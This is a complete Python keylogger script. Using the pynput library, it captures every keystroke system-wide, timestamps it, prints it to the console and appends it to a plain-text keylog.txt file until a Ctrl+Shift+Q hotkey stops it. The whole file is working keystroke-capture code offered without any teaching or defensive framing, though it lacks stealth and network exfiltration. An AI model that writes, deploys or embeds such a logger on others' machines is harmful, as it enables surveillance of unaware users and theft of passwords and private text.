from pynput import keyboard
from datetime import datetime
import threading
import os

LOG_FILE = "keylog.txt"
listener = None

def write_log(line):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[ERROR] Could not write to log file: {e}")

def on_press(key):
    try:
        # Format printable characters
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = f"[{key.name.upper()}]"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{timestamp} - {key_str}")
        write_log(f"{timestamp} - {key_str}")

    except Exception as e:
        print(f"[ERROR] Exception in on_press: {e}")

def start_keylogger():
    global listener
    write_log("\n[SESSION START]")
    print("[INFO] Keylogger started. Press Ctrl + Shift + Q to stop.")

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"[ERROR] Failed to start keylogger: {e}")
        write_log(f"[ERROR] Failed to start keylogger: {e}")

def stop_keylogger():
    global listener
    write_log("[SESSION END]")
    print("[INFO] Hotkey pressed. Stopping keylogger.")
    if listener:
        try:
            listener.stop()
        except Exception as e:
            print(f"[ERROR] Could not stop listener: {e}")
            write_log(f"[ERROR] Could not stop listener: {e}")
    os._exit(0)

def monitor_hotkey():
    try:
        with keyboard.GlobalHotKeys({
            '<ctrl>+<shift>+q': stop_keylogger
        }) as h:
            h.join()
    except Exception as e:
        print(f"[ERROR] Failed to register hotkey: {e}")
        write_log(f"[ERROR] Failed to register hotkey: {e}")

if __name__ == "__main__":
    # Start keylogger and hotkey monitor in separate threads
    try:
        threading.Thread(target=start_keylogger, daemon=True).start()
        monitor_hotkey()
    except Exception as e:
        print(f"[ERROR] Unexpected error in main thread: {e}")
        write_log(f"[ERROR] Unexpected error in main thread: {e}")